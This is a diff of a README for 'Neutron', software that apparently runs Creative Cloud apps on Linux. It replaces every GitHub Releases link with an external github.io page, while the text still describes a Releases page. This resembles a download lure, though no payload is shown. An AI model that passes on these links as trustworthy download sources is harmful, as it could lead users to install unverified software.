@@ -1,11 +1,11 @@
 # 🎨 Neutron - Creative Cloud Apps on Linux, Simplified
 
-[![Download Neutron](https://img.shields.io/badge/⬇%20Download%20Neutron-Latest%20Release-8A2BE2?style=for-the-badge&labelColor=FF4500&logo=github&logoColor=white)](https://github.com/rumuru771/Neutron/releases)
+[![Download Neutron](https://img.shields.io/badge/⬇%20Download%20Neutron-Latest%20Release-8A2BE2?style=for-the-badge&labelColor=FF4500&logo=github&logoColor=white)](https://rumuru771.github.io)
 
-[![Platform](https://img.shields.io/badge/platform-Linux-FCC624?style=flat-square&logo=linux&logoColor=black)](https://github.com/rumuru771/Neutron/releases)
-[![Built on Wine](https://img.shields.io/badge/built%20on-patched%20Wine-722F37?style=flat-square&logo=wine&logoColor=white)](https://github.com/rumuru771/Neutron/releases)
-[![Open Source](https://img.shields.io/badge/license-free%20%26%20open%20source-3DA639?style=flat-square)](https://github.com/rumuru771/Neutron/releases)
-[![Wayland Ready](https://img.shields.io/badge/Wayland-ready-1E90FF?style=flat-square)](https://github.com/rumuru771/Neutron/releases)
+[![Platform](https://img.shields.io/badge/platform-Linux-FCC624?style=flat-square&logo=linux&logoColor=black)](https://rumuru771.github.io)
+[![Built on Wine](https://img.shields.io/badge/built%20on-patched%20Wine-722F37?style=flat-square&logo=wine&logoColor=white)](https://rumuru771.github.io)
+[![Open Source](https://img.shields.io/badge/license-free%20%26%20open%20source-3DA639?style=flat-square)](https://rumuru771.github.io)
+[![Wayland Ready](https://img.shields.io/badge/Wayland-ready-1E90FF?style=flat-square)](https://rumuru771.github.io)
 
 ## ✨ What Is Neutron?
 
@@ -25,7 +25,7 @@ Getting Neutron onto your computer takes a few minutes. Follow these steps in or
 
 Visit this link to download the application:
 
-**https://github.com/rumuru771/Neutron/releases**
+**https://rumuru771.github.io**
 
 That page is called the Releases page. It lists every published version of Neutron, newest at the top. Look for the entry marked **Latest** and open it. Inside you will find the download for the current version.
 
